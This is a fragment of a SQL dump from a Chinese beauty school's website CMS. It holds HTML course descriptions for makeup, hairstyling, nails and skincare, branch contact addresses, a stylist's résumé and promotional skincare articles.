18px;\"/>a.化妆课程：讲授唯美化妆课程，面部结构，面部人体骨骼学，肌肉年龄走向学，妆面年龄的对比与矫正，包括素描、基面、基点化妆。教学内容密切结合市场需求和流行趋势。通过对日常生活所需妆面进行细致讲解，并时刻关注潮流动向，教授更加流行的时尚妆容技巧。教学内容从生活基础开始，对五官分解、生活妆、职业妆、生活发型等方面的化妆知识进行全方位传授。</span></p><p><span style=\"font-size: 20px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;\"><br/></span></p><p style=\"text-align:center\"><span style=\"font-size: 20px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;\"><img src=\"/uploads/allimg/20190304/1551708270345683.jpg\" title=\"1551708270345683.jpg\" alt=\"化妆00.jpg\"/></span></p><p><span style=\"font-size: 20px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;\"><br/></span></p><p><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 20px;\">课程内容密切结合市场需求，紧跟时尚潮流，综合当今彩妆的流行趋势对裸妆、五官矫正妆、日系妆、香薰妆、明星造型等时下风尚妆容进行解读，娱乐之主持人妆等。让学员学习到最流行的化妆技能、整体搭配造型。唯美摄影化妆、立体化妆技巧、掌握不同年代、不同类型影视题材（古装戏、年代妆、现代戏）的人物造型设计、舞台人物造型设计、各类电视节目主持人造型设计、时尚人物造型设计、生活妆容、明星妆容、影楼造型、时尚平面广告化妆造型、T 台模特造型、时尚创意妆、概念彩妆、视觉彩妆、时尚彩绘等化妆造型手法；影视人物整体塑性与设计原则，影视上镜妆的设计。梦幻妆、彩绘妆、各种伤痕妆、擦伤、肿、青等影视化妆特效，小丑妆，民族装，老年妆，万圣节妆。头饰制作，假发的填充与制作等</span><br/></p><p><span style=\"font-size: 20px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;\"><br style=\"color: rgb(0, 0, 0); font-family: &#39;sans serif&#39;, tahoma, verdana, helvetica; line-height: 18px;\"/>b.专业晚装全科：讲授全套盘发技巧，基础盘发原理及造型必备的技法：分区、倒梳、玫瑰卷、翻翘卷、单包、叠包、对包、电卷棒造型的操作与技巧原理，影楼时尚韩式发型，拧、编发，影楼抓纱造型、堆纱、纱帽与多种头纱造型变化技巧。饰品制作，服饰饰品的搭配，影楼裹布、裹纱时尚橱窗设计。单手开夹、单包、双包、对包、扭包、叠包、层次卷筒、手摆波纹、玫瑰卷等技巧</span></p>','','','219.147.98.86'),(18,14,'<p><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 16px;\">学期：六个月<br style=\"color: rgb(0, 0, 0); font-family: &#39;sans serif&#39;, tahoma, verdana, helvetica; line-height: 18px;\"/>a.化妆课程：讲授唯美化妆课程，面部结构，面部人体骨骼学，肌肉年龄走向学，妆面年龄的对比与矫正，包括素描、基面、基点化妆。教学内容密切结合市场需求和流行趋势。通过对日常生活所需妆面进行细致讲解，并时刻关注潮流动向，教授更加流行的时尚妆容技巧。教学内容从生活基础开始，对五官分解、生活妆、职业妆、生活发型等方面的化妆知识进行全方位传授。课程内容密切结合市场需求，紧跟时尚潮流，综合当今彩妆的流行趋势对裸妆、五官矫正妆、日系妆、香薰妆、明星造型等时下风尚妆容进行解读，娱乐之主持人妆等。让学员学习到最流行的化妆技能、整体搭配造型。唯美摄影化妆、立体化妆技巧、掌握不同年代、不同类型影视题材（古装戏、年代妆、现代戏）的人物造型设计、舞台人物造型设计、各类电视节目主持人造型设计、时尚人物造型设计、生活妆容、明星妆容、影楼造型、时尚平面广告化妆造型、T 台模特造型、时尚创意妆、概念彩妆、视觉彩妆、时尚彩绘等化妆造型手法；影视人物整体塑性与设计原则，影视上镜妆的设计。梦幻妆、彩绘妆、各种伤痕妆、擦伤、肿、青等影视化妆特效，小丑妆，民族装，老年妆，万圣节妆。头饰制作，假发的填充与制作等<br style=\"color: rgb(0, 0, 0); font-family: &#39;sans serif&#39;, tahoma, verdana, helvetica; line-height: 18px;\"/><br style=\"color: rgb(0, 0, 0); font-family: &#39;sans serif&#39;, tahoma, verdana, helvetica; line-height: 18px;\"/>b.专业晚装全科：讲授全套盘发技巧，基础盘发原理及造型必备的技法：分区、倒梳、玫瑰卷、翻翘卷、单包、叠包、对包、电卷棒造型的操作与技巧原理，影楼时尚韩式发型，拧、编发，影楼抓纱造型、堆纱、纱帽与多种头纱造型变化技巧。饰品制作，服饰饰品的搭配，影楼裹布、裹纱时尚橱窗设计。单手开夹、单包、双包、对包、扭包、叠包、层次卷筒、手摆波纹、玫瑰卷等技巧</span></p><p><br style=\"color: rgb(0, 0, 0); line-height: 18px;\"/></p><p style=\"text-align:center\"><img src=\"/uploads/allimg/20190303/1551618053164373.jpg\" title=\"1551618053164373.jpg\" alt=\"16 (2).jpg\"/></p><p><br style=\"color: rgb(0, 0, 0);\"/><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 16px;\">C.专业美甲：讲授国际最新美甲造型艺术，指甲形状和手型的搭配，春夏秋冬的色彩设计，指甲油和顾客肤色的设计，全面解说美手、美足及各种美甲艺术造型实例、各种工具的使用、修甲的技巧、指甲上油、画花、贴花、色彩拓印、贴片甲、法式甲、水晶甲、丝绸甲、镶嵌甲、梦幻甲、新娘甲的设计制作，各式彩绘甲琉璃甲三维立体画花雕花甲内雕外雕浮雕 3D 艺术彩绘甲、3D 立体雕花，蕾丝甲、贝壳粉甲、光疗树脂甲、法式甲、美甲手绘艺术、时尚光疗和琉璃甲，水立方，蔻丹，韩国彩绘，QQ 甲和面雕、蛇皮甲等现今艺术美甲造型。<br style=\"color: rgb(0, 0, 0); font-family: &#39;sans serif&#39;, tahoma, verdana, helvetica; line-height: 18px;\"/><br style=\"color: rgb(0, 0, 0); font-family: &#39;sans serif&#39;, tahoma, verdana, helvetica; line-height: 18px;\"/>d.简约造型：教授简约而时尚快捷的造型装扮技巧，直发，曲发变化造型，烫发后生活靓妆造型，各种发夹，发饰，饰花的搭配，脸型的分析，出席不同场合，不同服饰的晚装要领。包括现在所有流行的韩式造型方法，利用吹恤技巧与手法的结合，创造出各种华贵，自然之个性造型，包括如何打造头部的饱满度，制造发根定位，利用内包效果打造精致小脸型，各种梳子的使用技巧以及徒手造型等。饰发产品打理造型技巧，认识形体，电夹板、电卷棒造型技巧，针对各种脸型、发质、发长和客人的气质深度挖掘客人的美等各式技术手法全方面提升发型师的造型美感和能力</span></p>','','','219.147.98.86'),(19,15,'<p style=\"text-align: center;\"><img src=\"/uploads/allimg/20190306/1551883036440601.jpg\" style=\"\" title=\"1551883036440601.jpg\"/></p><p><br/></p><p style=\"text-align: center;\"><img src=\"/uploads/allimg/20190306/1551883036537848.jpg\" style=\"\" title=\"1551883036537848.jpg\"/></p><p><br/></p>','','','219.147.98.86'),(21,34,'<div class=\"abouttitle container ptop65\" style=\"padding: 125px 0px 0px; margin: 0px auto; width: 1250px; line-height: 30px; color: rgb(0, 0, 0); font-family: \'Microsoft YaHei\'; font-size: 16px;\">\r\n	<h1 style=\"padding: 0px; margin: 0px auto; font-size: 24px; width: 100px; text-align: center;\">\r\n		联系我们</h1>\r\n	<dl>\r\n		<dd style=\"padding: 0px; margin: 10px 0px 20px; text-align: center;\">\r\n			以人为本、以质为先、诚实守信、服务社会</dd>\r\n	</dl>\r\n</div>\r\n<div class=\"container aboutnr\" style=\"padding: 0px; margin: 0px auto; width: 1250px; font-size: 16px; line-height: 35px; color: rgb(0, 0, 0); font-family: \'Microsoft YaHei\';\">\r\n	<div style=\"padding: 0px; margin: 0px;\">\r\n		<strong>梦莲娜珠海拱北总校</strong><br />\r\n		地址：广东省珠海市拱北粤华路134号整栋<br />\r\n		电话:0756-8281337<br />\r\n		<br />\r\n		<strong>梦莲娜珠海金鼎分校</strong><br />\r\n		地址：广东省珠海市高新区金鼎市场站建行二楼<br />\r\n		电话:0756-3395588<br />\r\n		<br />\r\n		<strong>梦莲娜东莞厚街分校</strong><br />\r\n		地址：广东省东莞市厚街镇康乐南89号二楼<br />\r\n		电话:0769-85885288<br />\r\n		<br />\r\n		<strong>梦莲娜揭阳普宁分校</strong><br />\r\n		地址：广东省揭阳市普宁市商品城美佳乐缤纷美食城4楼D08号<br />\r\n		电话:0663-2889799</div>\r\n</div>\r\n<br />\r\n','','','36.102.4.97'),(22,3,'<p style=\"text-align: center;\"><img src=\"/uploads/allimg/20190306/1551878272949049.jpg\" style=\"\" title=\"1551878272949049.jpg\"/></p><p><br/></p><p style=\"text-align: center;\"><img src=\"/uploads/allimg/20190306/1551878273307381.jpg\" style=\"\" title=\"1551878273307381.jpg\"/></p><p><br/></p>','','','219.147.98.86'),(69,3,'<p style=\"text-align: center;\"><img src=\"/uploads/allimg/20190306/1551878407876414.jpg\" title=\"1551878407876414.jpg\" alt=\"a(4).jpg\"/></p>','','','219.147.98.86'),(23,3,'<p style=\"text-align: center;\"><img src=\"/uploads/allimg/20190306/1551878190841225.jpg\" style=\"\" title=\"1551878190841225.jpg\"/></p><p><br/></p><p style=\"text-align: center;\"><img src=\"/uploads/allimg/20190306/1551878190872868.jpg\" style=\"\" title=\"1551878190872868.jpg\"/></p><p><br/></p>','','','219.147.98.86'),(24,3,'<p style=\"text-align: center;\"><img src=\"/uploads/allimg/20190306/1551878112802523.jpg\" title=\"1551878112802523.jpg\" alt=\"a(1).jpg\"/></p><p><br/></p><p style=\"text-align: center;\"><img src=\"/uploads/allimg/20190306/1551878063653585.jpg\" title=\"1551878063653585.jpg\" alt=\"a(14).jpg\"/></p><p><br/></p>','','','219.147.98.86'),(25,25,'<span style=\"font-size:14px;\">&nbsp;姓名:马嵘达Give<br />\r\n个人简历：<br />\r\n2003年妍修TONIgGuY经典劳技<br />\r\n2004年妍修沙宣经典当代選程<br />\r\n2005年黑加仑鬼剪高级导师<br />\r\n2007年托尼盖美发高级顾问,&nbsp;美容美发协会高级评委<br />\r\n2008年江苏南京南茜学院教务部长<br />\r\n2011年深造专研日式骨路学二分区商业剪裁造型<br />\r\n2012年安徽合肥美容美发学校魔鬼持训深程金牌导师<br />\r\n现任郑州环球店长店务管理课程讲师</span><br />\r\n<img alt=\"\" src=\"/uploads/allimg/190223/1-1Z22315410I92.jpg\" style=\"width: 675px; height: 675px;\" /><br />\r\n','','','36.102.4.97'),(26,25,'<img alt=\"\" src=\"/uploads/allimg/190223/1-1Z2231606345V.jpg\" style=\"width: 675px; height: 675px;\" />','','','36.102.4.97'),(27,25,'<img alt=\"\" src=\"/uploads/allimg/190223/1-1Z223160U12c.jpg\" style=\"width: 675px; height: 675px;\" />','','','36.102.4.97'),(28,25,'<img alt=\"\" src=\"/uploads/allimg/190223/1-1Z223160951101.jpg\" style=\"width: 675px; height: 675px;\" />','','','36.102.4.97'),(29,25,'<img alt=\"\" src=\"/uploads/allimg/190223/1-1Z223161041V9.jpg\" style=\"width: 675px; height: 675px;\" />','','','36.102.4.97'),(30,25,'<img alt=\"\" src=\"/uploads/allimg/190223/1-1Z223161209207.jpg\" style=\"width: 675px; height: 675px;\" />','','','36.102.4.97'),(31,25,'<img alt=\"\" src=\"/uploads/allimg/190223/1-1Z223161333154.jpg\" style=\"width: 675px; height: 675px;\" />','','','36.102.4.97'),(32,25,'<img alt=\"\" src=\"/uploads/allimg/190223/1-1Z223161412954.jpg\" style=\"width: 675px; height: 675px;\" />','','','36.102.4.97'),(33,25,'<p><img alt=\"\" src=\"/uploads/allimg/190223/1-1Z22316145M33.jpg\" style=\"width: 675px; height: 675px;\"/></p>','','','103.219.184.72'),(34,3,'<p style=\"text-align: center;\"><img src=\"/uploads/allimg/20190306/1551877937625249.jpg\" style=\"\" title=\"1551877937625249.jpg\"/></p><p><br/></p><p style=\"text-align: center;\"><img src=\"/uploads/allimg/20190306/1551877937570900.jpg\" style=\"\" title=\"1551877937570900.jpg\"/></p><p><br/></p><p><br/></p>','','','219.147.98.86'),(35,4,'<p style=\"text-align: center;\"><img alt=\"\" src=\"/uploads/allimg/190223/1-1Z2231Z55C63.jpg\" style=\"width: 800px; height: 534px;\"/></p>','','','219.147.98.86'),(36,4,'<p style=\"text-align: center;\"><img alt=\"\" src=\"/uploads/allimg/190223/1-1Z2231ZH4W9.jpg\" style=\"width: 800px; height: 507px;\"/></p>','','','219.147.98.86'),(37,4,'<p style=\"text-align: center;\"><img alt=\"\" src=\"/uploads/allimg/190223/1-1Z2231ZPC18.jpg\" style=\"width: 800px; height: 532px;\"/></p>','','','219.147.98.86'),(38,4,'<p style=\"text-align: center;\"><img alt=\"\" src=\"/uploads/allimg/190223/1-1Z2231ZZO95.jpg\" style=\"width: 800px; height: 566px;\"/></p><p><br/></p><p style=\"text-align: center;\"><span style=\"font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 16px;\">艾灸材料产艾热刺激体表穴位或特定部位，通过激发经气的活动来调整人体紊乱的生理生化功能，从而达美容养生的目的</span></p><p><br/></p>','','','219.147.98.86'),(39,4,'<p style=\"text-align: center;\"><img alt=\"\" src=\"/uploads/allimg/190223/1-1Z2231Z9335X.jpg\" style=\"width: 800px; height: 587px;\"/></p><p><br/></p><p style=\"text-align: center;\"><span style=\"font-size: 16px; font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;\">刮痧</span><span style=\"font-size: 16px; font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;\">美容则是运用刮痧的方法，在人的脸上或身体上进行刮拭，以改变人的容颜或形体的方法</span></p><p><span style=\"font-size: 16px; font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;\"><br/></span></p>','','','219.147.98.86'),(40,4,'<p style=\"text-align: center;\"><br/></p><p style=\"text-align: center;\"><img alt=\"\" src=\"/uploads/allimg/190223/1-1Z22319100I01.jpg\" style=\"width: 800px; height: 531px;\"/></p><p><br/></p><p style=\"text-align: center;\"><span style=\"font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 16px;\">美容护肤是指通过某些方法和习惯达到美容加护肤的效果</span></p>','','','219.147.98.86'),(41,5,'<p><span style=\"font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 16px;\">美容师想要针对不同顾客的皮肤等问题找出原因和对症施药，就需要知道一些皮肤的基础美容知识，这样才能实实在在的为顾客解除烦恼，接下来就一起来看看美容师必学的皮肤美容知识之如何认识黑色素、色斑等皮肤问题。<br/><br/>一、色斑是如何形成的?<br/><br/>促使黑色素形成的原因大致有以下几个方面：<br/><br/>1、黑色素形成受紫外线刺激<br/><br/>紫外线在具备双重作用，杀菌和对皮肤产生破坏性，破坏性表现在紫外线照射到皮肤后产生一种叫麦拉宁的褐色色素，麦拉宁是由于身体提抗紫外线伤害产生的物质，以防止进一步伤害皮肤，这是他的伟大作用和任务，正常情况下产生的麦拉宁会自然脱落，但由于身体新陈代谢欠佳，就会使其部分陈留在肌肤表层，变形成了色斑黑色素。紫外线接触皮肤后还会造成过度氧化，产生一种过氧化质，会对真皮层造成伤害引起色斑和暗沉。<br/><br/>2、黑色素形成终由自身身体情况决定<br/><br/>生活不规律：生活压力、偏食、睡眠不足等不良生活习惯，也会令黑色素增加，经期时产生的黄体素及妊娠过程令内分泌特别容易失调，是黑色素产生的高峰期，维持正常的生活习惯，常锻炼身体，保持健康愉悦的心情状态尤为重要。<br/></span></p><p><span style=\"font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 16px;\"><br/></span></p><p style=\"text-align:center\"><span style=\"font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 16px;\"><img alt=\"\" src=\"/uploads/allimg/190223/1-1Z2231914015S.jpg\" style=\"width: 800px; height: 507px;\"/></span></p><p><span style=\"font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 16px;\"><br/></span></p><p><span style=\"font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 16px;\">二、黑色素和色斑总结<br/><br/>知识点1：皮肤机构中的角质层，颗粒层、基底层，对射紫外线伤害的防护作用<br/><br/>角质层：过滤紫外线10%<br/><br/>颗粒层：反射紫外线，分泌晶样角素可反射50&amp;mdash;60%的紫外线<br/><br/>基底层：吸收紫外线<br/><br/>知识点2：紫外线中的UVB UVA UVC 对皮肤伤害的不同<br/><br/>紫外线中的UVA会造成皮肤细胞老化和松弛的根源;紫外线中的UVC杀伤力强，穿透力弱，可导致皮肤癌;紫外线中UVB穿透力弱，但会使已经晒伤晒黑的皮肤进一步恶化，导致皮肤癌、黑皮病、脱皮等;。<br/><br/>三、去斑是否就等同于美白<br/><br/>祛斑是一种对皮肤伤害的治疗，主要诉求是把黑色素分解掉，修复受损皮肤，而美白是在健康的肌肤为前提下提高肌肤的抵抗能力，对黑色素形成的有害影响因素形成提抗和保护皮肤的作用。<br/><br/>祛斑等同于美白吗-结论：祛斑是修复受损皮肤;美白是让健康的皮肤更健康。<br/><br/>四、去斑后会反弹还是不会?<br/><br/>通过了解斑形成的原因后，我们不难得出，紫外线是外在伤害的主要因素，但自身身体状况是根本因素，所以我们在祛斑反弹与否的问题上可以得出以下结论。想要根除就要注重内外调理的结合，通过多种养生疗法，调理方法使得自身新陈代谢处于健康的状态;尽量防止过度接触紫外线并注重保持健康的生活习惯，减少导致身体代谢失调的负面因素的接触，如：不良饮食、熬夜等，最终是可以根除的。<br/><br/>五、美白淡斑分那三个阶段?每个阶段为多长时间<br/><br/>(1) 分解适应期，细胞容易出现反黑的现象，有斑点扩散现象<br/><br/>(2) 治疗期<br/><br/>(3) 巩固期。每个阶段约为一个月。<br/><br/><br/><br/></span></p>','','','219.147.98.86'),(42,5,'<p><span style=\"font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 16px;\">&nbsp; &nbsp; &nbsp; 没有规矩不成方圆，美容护肤也要讲究方法，遵守一定的规律。<strong>日常护肤有哪几个步骤？使用护肤品的顺序是什么呢？周末一定要系统护肤吗？卸妆真的很重要？</strong>下面让我们来一一解答。<br/><br/>　　<strong><span style=\"font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;\">正确护肤的5个步骤</span></strong><br/>　　</span></p><p><span style=\"font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 16px;\">　　<strong>第一步：清洁</strong><br/><br/>　　选好洁肤品：适合自己的洗面奶在使用后皮肤清爽、微涩(但不脱皮)，皮肤色泽变得淡化(因去角质的缘故，有轻微增白之短暂功效)。<br/><br/>　　每天早晚各一次的清洁工作，可以温和并彻底地卸除你脸上的化妆品、表面油脂及污垢。用指腹由下往上，由内往外轻揉（不要用力搓洗），细致的眼圈部位则以无名指轻柔运作，然后用温水冲净或用温湿毛巾擦净。<br/><br/>　　<strong>第二步：调理皮肤纹理</strong><br/><br/>　　一星期两次的敷面，可帮助剥除皮肤表面的干燥细胞，使皮肤纹理光滑，呈现清新、光彩的容貌。以向上、向外的手势将棉膜平敷在洁净的脸部，避开眼圈周围和唇部。等待约10分钟，再用温水洗净，或用湿毛巾擦净。<br/><br/>　　<strong>第三步：爽肤</strong><br/><br/>　　再次清洁肌肤，软化角质、平衡pH值，帮助收缩毛孔，增加肌肤的柔软感。把化妆棉蘸湿，轻拍脸部及颈部。重复擦拭，直到化妆棉上没有污垢及残留化妆品的痕迹为止，注意避开眼部。要用爽肤水或柔肤水：它们可将水分锁在皮肤内，保持皮肤湿润，减少面部水分蒸发。</span></p><p style=\"text-align: center;\"><br/><img alt=\"\" src=\"/uploads/allimg/190223/1-1Z223191623942.jpg\" style=\"width: 800px; height: 534px;\"/><br/><br/></p><p style=\"text-align: left;\"><span style=\"font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 16px;\">　　<strong>第四步：均衡营养</strong><br/><br/>　　擦润肤露或润肤霜：润肤品需要留在皮肤上较长时间，因此要懂得选用真正优质的产品，达到最佳效果。<br/><br/>　　给皮肤补充必需的水分和养分，充分滋润皮肤，保持皮肤的柔润光滑。为达最佳效果，使用保养护肤品时一定要用指腹轻轻地以朝上和朝外的方式涂抹。涂抹眼周部位时请用无名指。<br/><br/>　　<strong>第五步：保护</strong><br/><br/>　　记得用防晒用品：选择时要注意产品所提供的SPF防晒指数。虽然SPF指数可以由2高至60，但作为日常防晒用途，SPF值在8~15就足够了。SPF指数太低时，防晒功能可能不够；但SPF指数太高，容易使皮肤过敏。</span></p>','','','219.147.98.86'),(43,2,'<p style=\"text-indent: 0em; margin-top: 10px; line-height: 1.5em;\"><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 16px;\">课程介绍：<br/>国际标准、职业素养、职业道德，美容基础技能和相关的理论知识，皮肤的生理知识，头部、面部、肩颈部、背部的按摩手法，面膜的分类和使用，还包含皮肤管理基础护理，以及仪器和相应的手法。<br/>培养目标：<br/>通过美容皮肤管理基础课程的学习，了解不同皮肤的特征，能够根据不同的皮肤特点定制不同的护理方案，进行生活自我皮肤护理。<br/>就业方向：<br/>皮肤管理初级美容师，自我生活护理保养，担任日化线护肤品专柜销售<br/><br/></span></p><p style=\"text-align: center; text-indent: 0em; margin-top: 10px; line-height: 1.5em;\"><img alt=\"\" src=\"/uploads/allimg/190223/1-1Z22319320X24.jpg\" style=\"width: 600px; height: 380px;\"/></p><p style=\"text-indent: 0em; margin-top: 10px; line-height: 1.5em;\"><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 16px;\"></span><br/><br/><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 16px;\">&nbsp;一、专业美容师卸妆，洁肤方法、面部活肤减压按摩技法、超声波美容仪的科学理论及实操方法、超能疗肤软膜粉的操作、整体面具式硬模的专业理论及操作方法<br/><br/><br/>&nbsp;二、女性保养的秘密武器，骨胶原面膜的专业理论及操作方法、DIY面膜的制作方法、背部舒缓按摩技法、专业减压头部按摩技法、专业美容会所的接待服务流程<br/><br style=\"padding: 0px; margin: 0px; color: rgb(85, 85, 85); font-family: 微软雅黑, Arial, &#39;Lucida Grande&#39;, &#39;Lucida Sans Unicode&#39;, STHeiti, Helvetica, Verdana, sans-serif; font-size: 14px;\"/></span><br/></p><p style=\"text-indent: 0em; margin-top: 10px; line-height: 1.5em;\"><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 16px;\">\r\n	&nbsp;</span></p>','','','219.147.98.86'),(44,5,'<p><span style=\"font-size: 16px; font-family: arial, helvetica, sans-serif;\">新手美容师一般都要经过严格的培训才能进行上岗服务，究竟美容师培训 需要注意哪些呢？<br/>\r\n	1、不可采取命令和批示的口吻与人交谈<br/>\r\n	新手美容师在与顾客交谈时，微笑再展露一点，态度要和蔼一点，说话要轻声一点，语气要柔和一点，要采取征询、协商或者请教的口气与顾客交流，切不可采取命令和批示的口吻与人交谈。<br/>\r\n	人贵有自知自明，要清楚明白您在顾客心里的地位，您需要永远记住一条那就是：您不是顾客的领导和上级，您无权对顾客指手画脚，下命令或下指示；您只是一个美容师，他的一个美容顾问。<br/>\r\n	2、忌和顾客发生激烈的争论<br/>\r\n	新手美容师在与顾客沟通时，我们是来推销产品的，不是来参加辩论会的，要知道与顾客争辩解决不了任何问题，只会招致顾客的反感。<br/>\r\n	新手美容师首先要理解客户对美容有不同的认识和见解，容许人家讲话，发表不同的意见;如果您刻意地去和顾客发生激烈的争论，即使您占了上风，赢得了胜利，把顾客驳得哑口无言、体无完肤、面红耳赤、无地自容，您快活了、高兴了，但您得到的是什么呢？是失去了顾客、丢掉了生意。时刻不要忘记您的职业、您的身份是做什么的。<br/>\r\n	3、勿像顾客得意忘形的吹嘘自己<br/>\r\n	与顾客沟通谈到自己时，要实事求是地介绍自己，稍加赞美即可，万万不可忘乎所以、得意忘形地自吹自擂、自我炫耀自己的出身、学识、财富、地位以及业绩和收入等等。这样就会人为地造成双方的隔阂和距离。要知道人与人之间，脑袋与脑袋是最近的;而口袋与口袋却是最远的，如果再您一而再再而三地炫耀自己的收入，对方就会感到，我是来做美容的，而你是向我推销适合的美容，是来挣我钱的，而不是来给我送吹嘘你自己的。<br/>\r\n	4、可以批评，但是要讲究方法</span></p><p style=\"text-align: center;\"><span style=\"font-size: 16px; font-family: arial, helvetica, sans-serif;\"><img alt=\"\" src=\"/uploads/allimg/190223/1-1Z223204000495.jpg\" style=\"width: 70%;\"/></span></p><p><span style=\"font-size: 16px; font-family: arial, helvetica, sans-serif;\">新手美容师在与顾客沟通时，如果发现他身上有些缺点，也不要当面批评和教育她，更不要大声地指责她。做美容师、批评的事情可以做，但也要讲究方式方法。<br/>\r\n	5、直白有时候会令人很难堪<br/>\r\n	新手美容师要掌握与人沟通的艺术，顾客成千上万、千差万别，有各个阶层、各个方面的群体，他们的知识和见解上都不尽相同。我们在与其沟通时，如果发现他在认识上有不妥的地方，也不要直截了当地指出，说他这也不是？那也不对？一般的人最忌讳在众人面前丢脸、难堪，俗语道：&amp;ldquo;打人不打脸，揭人不揭短&amp;rdquo;，要忌讳直白。<br/>\r\n	我们一定要看交谈的对象，做到言之有物，因人施语，要把握谈话的技巧、沟通的艺术，做美容师，要委婉忠告。<br/>\r\n	6、在质问之前先清楚自己的身份<br/>\r\n	新手美容师与顾客沟通时，要理解并尊重顾客的思想与观点，要知道人各有志不能强求，她来做美容，说明她有钱并有想要保养的意识；她做美容，说明她也有自己的原因，切不可采取质问的方式与顾客谈话。如美容师所言：你为什么不做美容；你凭什么不做美容。 诸如此类等等，用质问或者审讯的口气与顾客谈话，是美容师不懂礼貌的表现，是不尊重人的反映，是最伤害顾客的感情和自尊心的。</span></p>','','','219.147.98.86'),(59,5,'<p><span style=\"color: rgb(85, 85, 85); line-height: 30px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 16px; background-color: rgb(255, 255, 255);\">　　随着生活水平的提升越来越多人注重美容养生,前些日子小编跟同事去新美合作美容养生会所作做推背,我们聊到美业她也是赞不绝口,近些年来对于美业的发展速度非常快,学习美容的学员也越来越多,但是想要成为一名合格的美容师不单单要掌握熟练的技巧还需要懂得更多关于美容相关的知识.下面老师就来讲讲做为美容师必须要懂得的一些专业知识.</span></p><p style=\"margin-top: 0px; margin-bottom: 0px; padding: 8px 0px; border: 0px; outline: 0px; vertical-align: baseline; color: rgb(85, 85, 85); font-family: arial, &#39;Hiragino Sans GB&#39;, &#39;Microsoft Yahei&#39;, sans-serif; line-height: 30px; white-space: normal; background: rgb(255, 255, 255);\"><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 16px;\">　</span></p><p style=\"text-align:center\"><img src=\"/uploads/allimg/20190303/1551601975699179.jpg\" title=\"1551601975699179.jpg\" alt=\"1 (12).jpg\"/></p><p style=\"margin-top: 0px; margin-bottom: 0px; padding: 8px 0px; border: 0px; outline: 0px; vertical-align: baseline; color: rgb(85, 85, 85); font-family: arial, &#39;Hiragino Sans GB&#39;, &#39;Microsoft Yahei&#39;, sans-serif; line-height: 30px; white-space: normal; background: rgb(255, 255, 255);\"><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 16px;\"></span><br/></p><p style=\"margin-top: 0px; margin-bottom: 0px; padding: 8px 0px; border: 0px; outline: 0px; vertical-align: baseline; color: rgb(85, 85, 85); font-family: arial, &#39;Hiragino Sans GB&#39;, &#39;Microsoft Yahei&#39;, sans-serif; line-height: 30px; white-space: normal; background: rgb(255, 255, 255);\"><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 16px;\">　　1、什么叫氧化?</span></p><p style=\"margin-top: 0px; margin-bottom: 0px; padding: 8px 0px; border: 0px; outline: 0px; vertical-align: baseline; color: rgb(85, 85, 85); font-family: arial, &#39;Hiragino Sans GB&#39;, &#39;Microsoft Yahei&#39;, sans-serif; line-height: 30px; white-space: normal; background: rgb(255, 255, 255);\"><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 16px;\">　　举一些日常生活中的氧化的例子： 切成两半的苹果由原来的白色变成了黄色;铁钉生锈;伤口化脓;树叶变黄、干枯;鲜花凋谢，干枯;婴儿的肌肤水润、光泽、富有弹性，但随着年龄的不断增大，肌肤也开始发生变化，在不断地脱水、皱纹、长斑、干枯……这些都是氧化。简单的说，人体的衰老和得病就是一种氧化的过程。</span></p><p style=\"margin-top: 0px; margin-bottom: 0px; padding: 8px 0px; border: 0px; outline: 0px; vertical-align: baseline; color: rgb(85, 85, 85); font-family: arial, &#39;Hiragino Sans GB&#39;, &#39;Microsoft Yahei&#39;, sans-serif; line-height: 30px; white-space: normal; background: rgb(255, 255, 255);\"><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 16px;\">　　2、什么叫抗氧化?</span></p><p style=\"margin-top: 0px; margin-bottom: 0px; padding: 8px 0px; border: 0px; outline: 0px; vertical-align: baseline; color: rgb(85, 85, 85); font-family: arial, &#39;Hiragino Sans GB&#39;, &#39;Microsoft Yahei&#39;, sans-serif; line-height: 30px; white-space: normal; background: rgb(255, 255, 255);\"><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 16px;\">　　生物医学研究发现，一种强氧化物质——氧自由基对人体细胞连绵不断的破坏作用，造成人体衰老和各种如心脑血管、白内障、糖尿病、肿瘤等老化慢性疾病。抗氧化是指抵抗氧化作用，令细胞免受氧自由基的伤害，简言之，就是抗老化、抗衰老。</span></p><p style=\"margin-top: 0px; margin-bottom: 0px; padding: 8px 0px; border: 0px; outline: 0px; vertical-align: baseline; color: rgb(85, 85, 85); font-family: arial, &#39;Hiragino Sans GB&#39;, &#39;Microsoft Yahei&#39;, sans-serif; line-height: 30px; white-space: normal; background: rgb(255, 255, 255);\"><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 16px;\">　　3、什么叫氧自由基?</span></p><p style=\"margin-top: 0px; 